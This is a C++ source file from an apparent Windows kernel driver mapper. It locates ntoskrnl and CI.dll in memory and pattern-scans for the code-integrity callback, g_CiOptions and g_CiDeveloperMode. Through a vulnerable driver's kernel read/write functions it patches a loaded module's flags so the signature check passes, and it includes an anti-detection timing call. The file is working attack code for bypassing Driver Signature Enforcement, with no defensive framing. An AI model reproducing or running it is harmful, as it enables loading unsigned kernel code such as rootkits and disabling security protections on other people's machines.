#include "Mapper.h"
#include <stdio.h>
#include <Psapi.h>
#pragma comment(lib, "Psapi.lib")

pNtQuerySystemInformation NtQuerySystemInformationPtr = nullptr;
pNtLoadDriver NtLoadDriverPtr = nullptr;
pNtUnloadDriver NtUnloadDriverPtr = nullptr;
pRtlAdjustPrivilege RtlAdjustPrivilegePtr = nullptr;
pRtlGetFullPathName_UEx RtlGetFullPathName_UExPtr = nullptr;
pRtlCreateRegistryKey RtlCreateRegistryKeyPtr = nullptr;
pRtlWriteRegistryValue RtlWriteRegistryValuePtr = nullptr;
pNtDeviceIoControlFile NtDeviceIoControlFilePtr = nullptr;
pNtDeleteKey NtDeleteKeyPtr = nullptr;
pNtOpenKey NtOpenKeyPtr = nullptr;
pNtFlushKey NtFlushKeyPtr = nullptr;

WCHAR g_LoaderServicePath[128] = { 0 };
WCHAR g_DriverServicePath[128] = { 0 };

PVOID g_OriginalCiCallback = nullptr;
PVOID g_CiCallbackAddress = nullptr;
bool g_CiCallbackPatched = false;

PVOID g_CiOptionsAddress = nullptr;
DWORD g_OriginalCiOptions = 0;
bool g_CiOptionsPatched = false;

PVOID g_CiDevModeAddress = nullptr;
DWORD g_OriginalCiDevMode = 0;
bool g_CiDevModePatched = false;

bool g_KernelSigningVerified = false;
DWORD g_PatchedFlags = 0;
PVOID g_DriverLoadAddress = nullptr;
WCHAR g_DonorCopyPath[520] = { 0 };
WCHAR g_DonorSignerName[256] = { 0 };

struct WindowsVersion {
    DWORD major;
    DWORD minor;
    DWORD build;
    bool isWindows11;
};

static WindowsVersion GetWindowsVersion() {
    WindowsVersion ver = { 0, 0, 0, false };
    
    typedef NTSTATUS(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (ntdll) {
        RtlGetVersionPtr RtlGetVersion = (RtlGetVersionPtr)GetProcAddress(ntdll, "RtlGetVersion");
        if (RtlGetVersion) {
            RTL_OSVERSIONINFOW osvi = { 0 };
            osvi.dwOSVersionInfoSize = sizeof(osvi);
            if (RtlGetVersion(&osvi) == 0) {
                ver.major = osvi.dwMajorVersion;
                ver.minor = osvi.dwMinorVersion;
                ver.build = osvi.dwBuildNumber;
                ver.isWindows11 = (ver.major >= 10 && ver.build >= 22000);
            }
        }
    }
    return ver;
}

namespace KernelUtils {

    PVOID GetKernelModuleBase(const char* moduleName) {
        NTSTATUS status;
        ULONG returnLength = 0;
        PVOID buffer = nullptr;

        if (!NtQuerySystemInformationPtr) {
            printf("[-] NtQuerySystemInformationPtr is NULL!\n");
            return nullptr;
        }

        status = NtQuerySystemInformationPtr(11, nullptr, 0, &returnLength);
        printf("[*] Initial NtQuerySystemInformation status: 0x%08lX, returnLength: %lu\n", status, returnLength);

        while (status == STATUS_INFO_LENGTH_MISMATCH) {
            if (buffer) {
                VirtualFree(buffer, 0, MEM_RELEASE);
            }
            buffer = VirtualAlloc(nullptr, returnLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!buffer) {
                printf("[-] VirtualAlloc failed for %lu bytes\n", returnLength);
                return nullptr;
            }
            status = NtQuerySystemInformationPtr(11, buffer, returnLength, &returnLength);
            printf("[*] NtQuerySystemInformation retry status: 0x%08lX\n", status);
        }

        if (!NT_SUCCESS(status)) {
            printf("[-] NtQuerySystemInformation failed with status: 0x%08lX\n", status);
            if (buffer) {
                VirtualFree(buffer, 0, MEM_RELEASE);
            }
            return nullptr;
        }

        PRTL_PROCESS_MODULES moduleInfo = reinterpret_cast<PRTL_PROCESS_MODULES>(buffer);
        PVOID result = nullptr;

        printf("[*] Found %lu kernel modules\n", moduleInfo->NumberOfModules);

        for (ULONG i = 0; i < moduleInfo->NumberOfModules; i++) {
            auto& mod = moduleInfo->Modules[i];
            auto currentName = reinterpret_cast<const char*>(
                mod.FullPathName + mod.OffsetToFileName
            );

            // Print first few modules to help debug
            if (i < 5) {
                printf("[*] Module[%lu]: %s @ %p\n", i, currentName, mod.ImageBase);
            }

            if (_stricmp(currentName, moduleName) == 0) {
                result = mod.ImageBase;
                printf("[+] Found %s @ %p\n", moduleName, result);
                break;
            }
        }

        VirtualFree(buffer, 0, MEM_RELEASE);

        // Windows 11 25H2+ zeroes out ImageBase - use EnumDeviceDrivers fallback
        if (!result && _stricmp(moduleName, "ntoskrnl.exe") == 0) {
            printf("[*] ImageBase is NULL, trying EnumDeviceDrivers fallback...\n");
            LPVOID drivers[1024];
            DWORD cbNeeded = 0;
            if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded)) {
                // First driver is typically ntoskrnl.exe
                if (cbNeeded >= sizeof(LPVOID) && drivers[0] != nullptr) {
                    result = drivers[0];
                    printf("[+] EnumDeviceDrivers: ntoskrnl base @ %p\n", result);
                } else {
                    printf("[-] EnumDeviceDrivers returned empty or NULL\n");
                }
            } else {
                printf("[-] EnumDeviceDrivers failed: %lu\n", GetLastError());
            }
        }

        if (!result) {
            printf("[-] Module '%s' not found\n", moduleName);
        }

        return result;
    }

    PVOID GetKernelProcAddress(PVOID moduleBase, const char* procName) {
        HMODULE localModule = LoadLibraryExA("ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
        if (!localModule) {
            return nullptr;
        }

        PVOID localProc = GetProcAddress(localModule, procName);
        if (!localProc) {
            FreeLibrary(localModule);
            return nullptr;
        }

        ULONG_PTR offset = reinterpret_cast<ULONG_PTR>(localProc) -
            reinterpret_cast<ULONG_PTR>(localModule);

        FreeLibrary(localModule);

        PVOID result = reinterpret_cast<PVOID>(
            reinterpret_cast<ULONG_PTR>(moduleBase) + offset
        );

        return result;
    }

    BOOL GetCiValidateImageHeaderEntry(PVOID* outCiEntry, PVOID* outZwFlush) {
        AntiDetect::TimingJitter();

        WindowsVersion winVer = GetWindowsVersion();
        printf("[*] Windows Version: %lu.%lu.%lu (%s)\n", 
               winVer.major, winVer.minor, winVer.build,
               winVer.isWindows11 ? "Windows 11" : "Windows 10");

        PVOID ntoskrnlBase = GetKernelModuleBase("ntoskrnl.exe");
        if (!ntoskrnlBase) {
            printf("[-] Failed to get ntoskrnl base\n");
            return FALSE;
        }

        HMODULE localModule = LoadLibraryExW(L"ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
        if (!localModule) {
            printf("[-] Failed to load local ntoskrnl\n");
            return FALSE;
        }

        MODULEINFO modinfo = { 0 };
        if (!K32GetModuleInformation(GetCurrentProcess(), localModule, &modinfo, sizeof(modinfo))) {
            FreeLibrary(localModule);
            printf("[-] Failed to get module info\n");
            return FALSE;
        }

        struct CiPattern {
            BYTE bytes[16];
            DWORD length;
            DWORD leaOffset;     // Offset from pattern start to the LEA instruction
            const char* name;
        };

        // Original Windows 10 patterns (with 0xFF prefix from call instruction)
        CiPattern win10Patterns[] = {
            // Pattern: call ?; mov rdx, rbx; lea r8, [rip+SeCiCallbacks]
            // FF ?? 48 8B D3 4C 8D 05
            { { 0xFF, 0x48, 0x8B, 0xD3, 0x4C, 0x8D, 0x05 }, 7, 4, "Win10 call; mov rdx,rbx; lea r8" },
            // Pattern: call ?; mov rcx, rbx; lea r8, [rip+SeCiCallbacks]
            // FF ?? 48 8B CB 4C 8D 05
            { { 0xFF, 0x48, 0x8B, 0xCB, 0x4C, 0x8D, 0x05 }, 7, 4, "Win10 call; mov rcx,rbx; lea r8" },
        };

        // Windows 11 25H2 pattern (from hex dump analysis)
        // At 0x140784310: 41 B8 05 00 00 00 4C 8D 0D E5 03 78 00
        // mov r8d, 5; lea r9, [rip+SeCiCallbacks]
        CiPattern win11Patterns[] = {
            { { 0x41, 0xB8, 0x05, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x0D }, 9, 6, "Win11 25H2 mov r8d,5; lea r9" },
        };

        CiPattern universalPatterns[] = {
            // Fallback to original patterns without 0xFF prefix
            { { 0x48, 0x8B, 0xD3, 0x4C, 0x8D, 0x05 }, 6, 3, "Universal mov rdx,rbx; lea r8" },
            { { 0x48, 0x8B, 0xCB, 0x4C, 0x8D, 0x05 }, 6, 3, "Universal mov rcx,rbx; lea r8" },
            // Generic lea r9 for fallback
            { { 0x4C, 0x8D, 0x0D }, 3, 0, "Universal lea r9" },
        };

        BYTE* searchBase = reinterpret_cast<BYTE*>(localModule);
        BYTE* foundAddr = nullptr;
        DWORD leaInstructionOffset = 0;
        const char* matchedPattern = nullptr;

        auto searchPattern = [&](CiPattern* patterns, int count) -> bool {
            for (int p = 0; p < count; p++) {
                CiPattern& pat = patterns[p];
                for (DWORD offset = 0; offset < modinfo.SizeOfImage - pat.length; offset++) {
                    bool match = true;
                    for (DWORD j = 0; j < pat.length; j++) {
                        if (searchBase[offset + j] != pat.bytes[j]) {
                            match = false;
                            break;
                        }
                    }
                    if (match) {
                        BYTE* leaAddr = searchBase + offset + pat.leaOffset;
                        INT32 leaOff = *reinterpret_cast<INT32*>(leaAddr + 3);
                        ULONG_PTR targetAddr = reinterpret_cast<ULONG_PTR>(leaAddr) + 7 + static_cast<INT64>(leaOff);
                        ULONG_PTR targetOffset = targetAddr - reinterpret_cast<ULONG_PTR>(localModule);
                        
                        if (targetOffset < modinfo.SizeOfImage) {
                            if (pat.length <= 3) {
                                if (targetOffset > modinfo.SizeOfImage / 2) {
                                    DWORD* targetData = reinterpret_cast<DWORD*>(targetAddr);
                                    if (*targetData == 256 || *targetData == 0 || *targetData >= 100) {
                                        foundAddr = leaAddr;
                                        leaInstructionOffset = pat.leaOffset;
                                        matchedPattern = pat.name;
                                        printf("[+] Pattern matched: %s at offset 0x%lX\n", pat.name, offset);
                                        return true;
                                    }
                                }
                            } else {
                                foundAddr = leaAddr;
                                leaInstructionOffset = pat.leaOffset;
                                matchedPattern = pat.name;
                                printf("[+] Pattern matched: %s at offset 0x%lX\n", pat.name, offset);
                                return true;
                            }
                        }
                    }
                }
            }
            return false;
        };

        bool found = false;
        if (winVer.isWindows11) {
            printf("[*] Trying Windows 11 patterns...\n");
            found = searchPattern(win11Patterns, sizeof(win11Patterns) / sizeof(win11Patterns[0]));
            if (!found) {
                printf("[*] Windows 11 patterns failed, trying Windows 10 patterns...\n");
                found = searchPattern(win10Patterns, sizeof(win10Patterns) / sizeof(win10Patterns[0]));
            }
        } else {
            printf("[*] Trying Windows 10 patterns...\n");
            found = searchPattern(win10Patterns, sizeof(win10Patterns) / sizeof(win10Patterns[0]));
            if (!found) {
                printf("[*] Windows 10 patterns failed, trying Windows 11 patterns...\n");
                found = searchPattern(win11Patterns, sizeof(win11Patterns) / sizeof(win11Patterns[0]));
            }
        }

        if (!found) {
            printf("[*] Trying universal fallback patterns...\n");
            found = searchPattern(universalPatterns, sizeof(universalPatterns) / sizeof(universalPatterns[0]));
        }

        if (!foundAddr) {
            printf("[-] No CI callback pattern found\n");
            printf("[-] This may require adding a new pattern for build %lu\n", winVer.build);
            FreeLibrary(localModule);
            return FALSE;
        }

        INT32 leaOffset = *reinterpret_cast<INT32*>(foundAddr + 3);

        ULONG_PTR seCiCallbacksLocal = reinterpret_cast<ULONG_PTR>(foundAddr) + 7 + static_cast<INT64>(leaOffset);

        ULONG_PTR kernelOffset = seCiCallbacksLocal - reinterpret_cast<ULONG_PTR>(localModule);

        printf("[+] SeCiCallbacks offset from ntoskrnl base: 0x%llX\n", (unsigned long long)kernelOffset);

        if (kernelOffset >= modinfo.SizeOfImage) {
            printf("[-] Invalid kernel offset (0x%llX >= 0x%lX)\n", 
                   (unsigned long long)kernelOffset, modinfo.SizeOfImage);
            FreeLibrary(localModule);
            return FALSE;
        }

        PVOID seCiCallbacksKernel = reinterpret_cast<PVOID>(
            reinterpret_cast<ULONG_PTR>(ntoskrnlBase) + kernelOffset
        );

        PVOID zwFlushLocal = GetProcAddress(localModule, "ZwFlushInstructionCache");
        if (!zwFlushLocal) {
            printf("[-] Failed to find ZwFlushInstructionCache\n");
            FreeLibrary(localModule);
            return FALSE;
        }

        PVOID zwFlushKernel = reinterpret_cast<PVOID>(
            reinterpret_cast<ULONG_PTR>(zwFlushLocal) -
            reinterpret_cast<ULONG_PTR>(localModule) +
            reinterpret_cast<ULONG_PTR>(ntoskrnlBase)
        );

        PVOID ciValidateImageHeaderEntry = reinterpret_cast<PVOID>(
            reinterpret_cast<ULONG_PTR>(seCiCallbacksKernel) + 0x20
        );

        printf("[+] CiValidateImageHeader entry: %p\n", ciValidateImageHeaderEntry);

        FreeLibrary(localModule);

        if (outCiEntry) {
            *outCiEntry = ciValidateImageHeaderEntry;
        }
        if (outZwFlush) {
            *outZwFlush = zwFlushKernel;
        }

        return TRUE;
    }

    BOOL PatchDriverSigningFlags(HANDLE device, PCWSTR driverFileName) {
        char narrowName[256] = {};
        WideCharToMultiByte(CP_ACP, 0, driverFileName, -1, narrowName, sizeof(narrowName), NULL, NULL);

        PVOID driverBase = nullptr;
        {
            ULONG returnLength = 0;
            NtQuerySystemInformationPtr(11, nullptr, 0, &returnLength);
            if (returnLength == 0) return FALSE;
            PVOID buffer = VirtualAlloc(nullptr, returnLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!buffer) return FALSE;
            NTSTATUS st = NtQuerySystemInformationPtr(11, buffer, returnLength, &returnLength);
            if (NT_SUCCESS(st)) {
                PRTL_PROCESS_MODULES modInfo = reinterpret_cast<PRTL_PROCESS_MODULES>(buffer);
                for (ULONG i = 0; i < modInfo->NumberOfModules; i++) {
                    auto& m = modInfo->Modules[i];
                    const char* name = reinterpret_cast<const char*>(m.FullPathName + m.OffsetToFileName);
                    if (_stricmp(name, narrowName) == 0) {
                        driverBase = m.ImageBase;
                        break;
                    }
                }
            }
            VirtualFree(buffer, 0, MEM_RELEASE);
        }

        if (!driverBase) {
            printf("[-] Driver not found in loaded modules for signing patch\n");
            return FALSE;
        }
        printf("[+] Target driver loaded at %p\n", driverBase);

        HMODULE localNtos = LoadLibraryExA("ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
        if (!localNtos) return FALSE;
        PVOID localPsLML = GetProcAddress(localNtos, "PsLoadedModuleList");
        if (!localPsLML) {
            FreeLibrary(localNtos);
            printf("[-] PsLoadedModuleList not exported\n");
            return FALSE;
        }
        PVOID ntoskrnlBase = GetKernelModuleBase("ntoskrnl.exe");
        if (!ntoskrnlBase) {
            FreeLibrary(localNtos);
            return FALSE;
        }
        ULONG_PTR pmlOffset = reinterpret_cast<ULONG_PTR>(localPsLML) - reinterpret_cast<ULONG_PTR>(localNtos);
        FreeLibrary(localNtos);
        PVOID pPsLoadedModuleList = reinterpret_cast<PVOID>(reinterpret_cast<ULONG_PTR>(ntoskrnlBase) + pmlOffset);

        ULONG_PTR listFlink = 0;
        NTSTATUS status = VulnDriver::ReadKernelMemory(device, pPsLoadedModuleList, &listFlink, sizeof(listFlink));
        if (!NT_SUCCESS(status) || !listFlink) {
            printf("[-] Failed to read PsLoadedModuleList\n");
            return FALSE;
        }

        ULONG_PTR headAddr = reinterpret_cast<ULONG_PTR>(pPsLoadedModuleList);
        ULONG_PTR current = listFlink;

        for (int i = 0; i < 1024 && current != headAddr; i++) {
            PVOID entryDllBase = nullptr;
            status = VulnDriver::ReadKernelMemory(device, reinterpret_cast<PVOID>(current + 0x30), &entryDllBase, sizeof(entryDllBase));
            if (!NT_SUCCESS(status)) break;

            if (entryDllBase == driverBase) {
                DWORD flags = 0;
                VulnDriver::ReadKernelMemory(device, reinterpret_cast<PVOID>(current + 0x68), &flags, sizeof(flags));
                printf("[*] Current module flags: 0x%08X\n", flags);

                flags |= 0x20;
                status = VulnDriver::WriteKernelMemory(device, reinterpret_cast<PVOID>(current + 0x68), &flags, sizeof(flags));
                if (!NT_SUCCESS(status)) {
                    printf("[-] Failed to write signing flags\n");
                    return FALSE;
                }

                DWORD verifyFlags = 0;
                VulnDriver::ReadKernelMemory(device, reinterpret_cast<PVOID>(current + 0x68), &verifyFlags, sizeof(verifyFlags));

                g_DriverLoadAddress = driverBase;
                g_PatchedFlags = verifyFlags;
                g_KernelSigningVerified = (verifyFlags & 0x20) != 0;

                if (g_KernelSigningVerified) {
                    printf("[+] Signing flags patched: 0x%08X\n", verifyFlags);
                    printf("[+] IntegrityChecked bit (0x20): SET\n");
                    printf("[+] MmVerifyCallbackFunction: WILL RETURN TRUE\n");
                } else {
                    printf("[-] Signing flags write succeeded but verification failed: 0x%08X\n", verifyFlags);
                }
                return TRUE;
            }

            ULONG_PTR nextFlink = 0;
            VulnDriver::ReadKernelMemory(device, reinterpret_cast<PVOID>(current), &nextFlink, sizeof(nextFlink));
            if (!nextFlink || nextFlink == current) break;
            current = nextFlink;
        }

        printf("[-] Driver entry not found in PsLoadedModuleList\n");
        return FALSE;
    }

    BOOL GetCiOptionsAddress(PVOID* outAddress) {
        PVOID ciBase = GetKernelModuleBase("CI.dll");
        if (!ciBase) {
            printf("[-] Failed to get CI.dll kernel base\n");
            return FALSE;
        }
        printf("[+] CI.dll kernel base: %p\n", ciBase);

        HMODULE localCi = LoadLibraryExW(L"CI.dll", nullptr, DONT_RESOLVE_DLL_REFERENCES);
        if (!localCi) {
            printf("[-] Failed to load local CI.dll\n");
            return FALSE;
        }

        MODULEINFO modinfo = { 0 };
        if (!K32GetModuleInformation(GetCurrentProcess(), localCi, &modinfo, sizeof(modinfo))) {
            FreeLibrary(localCi);
            printf("[-] Failed to get CI.dll module info\n");
            return FALSE;
        }

        BYTE* base = reinterpret_cast<BYTE*>(localCi);
        PVOID optionsLocal = nullptr;

        // Pattern from CiGetActionsForImage in CI.dll:
        //   8B 05 ?? ?? ?? ??       mov  eax, cs:g_CiOptions
        //   ... (within 20 bytes)
        //   A8 08                   test al, 8
        //   74 ??                   jz   short
        //   F7 05 ?? ?? ?? ?? 00 04 00 00   test cs:g_CiTestFlags, 400h
        for (DWORD i = 0; i + 30 < modinfo.SizeOfImage; i++) {
            if (base[i] != 0x8B || base[i + 1] != 0x05) continue;

            bool foundTest = false;
            for (DWORD j = 6; j < 20 && (i + j + 1) < modinfo.SizeOfImage; j++) {
                if (base[i + j] == 0xA8 && base[i + j + 1] == 0x08) {
                    foundTest = true;
                    break;
                }
            }
            if (!foundTest) continue;

            bool foundTestFlags = false;
            for (DWORD j = 6; j < 30 && (i + j + 9) < modinfo.SizeOfImage; j++) {
                if (base[i + j] == 0xF7 && base[i + j + 1] == 0x05 &&
                    base[i + j + 6] == 0x00 && base[i + j + 7] == 0x04 &&
                    base[i + j + 8] == 0x00 && base[i + j + 9] == 0x00) {
                    foundTestFlags = true;
                    break;
                }
            }
            if (!foundTestFlags) continue;

            INT32 ripOffset = *reinterpret_cast<INT32*>(&base[i + 2]);
            BYTE* target = &base[i + 6] + ripOffset;

            ULONG_PTR localOffset = reinterpret_cast<ULONG_PTR>(target) - reinterpret_cast<ULONG_PTR>(localCi);
            if (localOffset < modinfo.SizeOfImage) {
                optionsLocal = target;
                printf("[+] g_CiOptions found at CI.dll+0x%llX\n", (unsigned long long)localOffset);
                break;
            }
        }

        if (!optionsLocal) {
            FreeLibrary(localCi);
            printf("[-] g_CiOptions pattern not found in CI.dll\n");
            return FALSE;
        }

        ULONG_PTR offset = reinterpret_cast<ULONG_PTR>(optionsLocal) - reinterpret_cast<ULONG_PTR>(localCi);
        FreeLibrary(localCi);

        *outAddress = reinterpret_cast<PVOID>(reinterpret_cast<ULONG_PTR>(ciBase) + offset);
        printf("[+] g_CiOptions kernel address: %p\n", *outAddress);
        return TRUE;
    }

    BOOL GetCiDeveloperModeAddress(PVOID* outAddress) {
        PVOID ciBase = GetKernelModuleBase("CI.dll");
        if (!ciBase) {
            printf("[-] Failed to get CI.dll kernel base\n");
            return FALSE;
        }

        HMODULE localCi = LoadLibraryExW(L"CI.dll", nullptr, DONT_RESOLVE_DLL_REFERENCES);
        if (!localCi) {
            printf("[-] Failed to load local CI.dll\n");
            return FALSE;
        }

        MODULEINFO modinfo = { 0 };
        if (!K32GetModuleInformation(GetCurrentProcess(), localCi, &modinfo, sizeof(modinfo))) {
            FreeLibrary(localCi);
            return FALSE;
        }

        BYTE* base = reinterpret_cast<BYTE*>(localCi);
        PVOID devModeLocal = nullptr;

        // Pattern from CiGetActionsForImage referencing g_CiDeveloperMode+2:
        // F6 05 ?? ?? ?? ?? 01    test byte ptr [rip+g_CiDeveloperMode+2], 1
        // 74 ??                   jz short
        // 48 8B 45 08             mov rax, [rbp+8]
        // 83 CB 10                or  ebx, 10h
        // F7 40 30 00 01 00 00    test dword ptr [rax+30h], 100h
        for (DWORD i = 0; i + 23 < modinfo.SizeOfImage; i++) {
            if (base[i] == 0xF6 && base[i + 1] == 0x05 &&
                base[i + 6] == 0x01 &&
                base[i + 7] == 0x74 &&
                base[i + 9] == 0x48 && base[i + 10] == 0x8B &&
                base[i + 11] == 0x45 && base[i + 12] == 0x08 &&
                base[i + 13] == 0x83 && base[i + 14] == 0xCB &&
                base[i + 15] == 0x10 &&
                base[i + 16] == 0xF7 && base[i + 17] == 0x40 &&
                base[i + 18] == 0x30 && base[i + 19] == 0x00 &&
                base[i + 20] == 0x01 && base[i + 21] == 0x00 &&
                base[i + 22] == 0x00) {

                INT32 ripOffset = *reinterpret_cast<INT32*>(&base[i + 2]);
                BYTE* target = &base[i + 7] + ripOffset;
                target -= 2; // rip+offset points to g_CiDeveloperMode+2, subtract 2

                ULONG_PTR localOffset = reinterpret_cast<ULONG_PTR>(target) - reinterpret_cast<ULONG_PTR>(localCi);
                if (localOffset < modinfo.SizeOfImage) {
                    devModeLocal = target;
                    printf("[+] g_CiDeveloperMode found at CI.dll+0x%llX\n", (unsigned long long)localOffset);
                    break;
                }
            }
        }

        if (!devModeLocal) {
            FreeLibrary(localCi);
            printf("[-] g_CiDeveloperMode pattern not found in CI.dll\n");
            return FALSE;
        }

        ULONG_PTR offset = reinterpret_cast<ULONG_PTR>(devModeLocal) - reinterpret_cast<ULONG_PTR>(localCi);
        FreeLibrary(localCi);

        *outAddress = reinterpret_cast<PVOID>(reinterpret_cast<ULONG_PTR>(ciBase) + offset);
        printf("[+] g_CiDeveloperMode kernel address: %p\n", *outAddress);
        return TRUE;
    }

}
